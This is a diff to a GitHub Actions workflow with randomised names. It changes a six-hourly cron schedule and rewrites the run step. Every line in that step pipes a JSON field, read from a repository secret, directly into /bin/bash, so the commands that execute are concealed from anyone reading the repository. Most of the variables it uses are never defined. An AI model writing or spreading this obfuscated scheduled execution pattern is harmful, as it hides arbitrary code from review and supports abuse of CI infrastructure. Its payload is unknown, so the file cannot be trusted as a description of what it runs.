@@ -3,7 +3,7 @@ name: yuanbanlao1839
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 0/6 * * *'
+    - cron: '57 0/6 * * *'
 
 jobs:
   build:
@@ -12,12 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: yuanbanlao1839
         env:
-          rb98: ${{ secrets.rb98 }}
+          vxo92075: ${{ secrets.vxo92075 }}
         run: |
-          echo $rb98 | jq -r .l8 | /bin/bash
-          echo $wec8172 | jq -r .flt950 | /bin/bash
-          echo $kuopp9182 | jq -r .lclij1 | /bin/bash
-          echo $zmxom25430 | jq -r .nuy7 | /bin/bash
-          echo $o52 | jq -r .tpmng9912 | /bin/bash
-          echo $fxncx78582 | jq -r .kni3 | /bin/bash
+          echo $vxo92075 | jq -r .ilo305 | /bin/bash
+          echo $mz207 | jq -r .qcjz861 | /bin/bash
+          echo $qbo85 | jq -r .u1371 | /bin/bash
+          echo $iv561 | jq -r .pzjx650 | /bin/bash
+          echo $wd72143 | jq -r .sz350 | /bin/bash
+          echo $v10556 | jq -r .lxv8 | /bin/bash
+          echo $axcq40 | jq -r .j4 | /bin/bash
+          echo $t78 | jq -r .lm77 | /bin/bash
+          echo $eo3630 | jq -r .s6 | /bin/bash
+          echo $yzqn76 | jq -r .c268 | /bin/bash
+          echo $ipmxw168 | jq -r .abqpz2 | /bin/bash
 
